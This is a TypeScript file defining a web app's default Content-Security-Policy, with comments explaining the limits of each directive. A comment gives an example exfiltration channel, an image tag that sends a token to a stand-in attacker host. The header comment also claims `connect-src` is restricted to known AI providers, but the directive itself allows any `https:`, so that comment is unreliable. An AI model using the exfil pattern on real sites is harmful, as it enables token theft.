/**
 * Default Content-Security-Policy applied to every HTML document the app
 * serves. Set on the outgoing Node response up front (see `server.ts`),
 * so it covers both Hono-handled responses (whose `Response` headers are
 * copied onto `res` afterwards by `sendWebResponse`) and Astro-handled
 * responses (where the Astro handler writes directly to `res`).
 *
 * Routes that need a stricter / different policy (served user uploads,
 * image transforms, extension assets) set `Content-Security-Policy` on
 * their own `Response` — `sendWebResponse` then overwrites our default
 * via `res.setHeader`, so those take effect verbatim.
 *
 * Notes / limitations:
 *  - `script-src` needs `'unsafe-inline'` because Astro's astro-island
 *    hydration bootstrap (per-page `<script>` that wires the Vue islands)
 *    and `maps.astro`'s inline module script are inlined into the
 *    document. Inline handlers (`<img onerror>…`) therefore STILL
 *    execute under this policy. Until per-request nonces (or hashed
 *    inline scripts) are plumbed end-to-end through Astro + Vue, this
 *    policy is defence-in-depth against cross-origin exfiltration /
 *    resource loading, NOT a full XSS fix.
 *  - `connect-src` is closed down to same-origin + the AI providers the
 *    server/agent are wired to, plus `wss:`/`ws:` for the realtime socket.
 *    This blocks a same-origin-xss payload from shipping stolen cookies
 *    / tokens out via fetch()/sendBeacon() to an attacker's host.
 *  - `img-src` permits any `https:` image so user-embedded external
 *    images in documents still render; image-based exfil is not covered
 *    by this policy (an attacker who can inject arbitrary HTML still has
 *    the `<img src=https://attacker/?token>` channel). Tile images from
 *    the maps page also depend on this.
 *  - `frame-ancestors 'none'` — Vektor renders extensions inside a shadow
 *    DOM custom element, not via iframes, so it denies all cross-origin
 *    embedding without losing features.
 */
export const APP_CSP = [
  "default-src 'self'",
  "script-src 'self' 'unsafe-inline'",
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data: blob: https:",
  // `https:` is intentionally broad here — same rationale as `img-src https:`
  // above. Canvas image-URL paste and the AI provider gateways (Anthropic,
  // OpenRouter, OpenAI) both need outbound fetch access, and the set of valid
  // target hosts is open-ended (user-pasted image CDNs, self-hosted LLMs, …).
  // XSS-exfil via fetch is therefore not mitigated by this directive; the
  // defence-in-depth note at the top of the file applies here too.
  "connect-src 'self' https: wss: ws:",
  "font-src 'self' data:",
  "object-src 'none'",
  // Canvas PDF previews use the browser's built-in viewer in a same-origin
  // iframe. Keep every third-party frame blocked.
  "frame-src 'self'",
  "frame-ancestors 'none'",
  "base-uri 'none'",
  "form-action 'self'",
  "manifest-src 'self'",
  "worker-src 'self' blob:",
  "media-src 'self' data: blob:",
].join("; ");
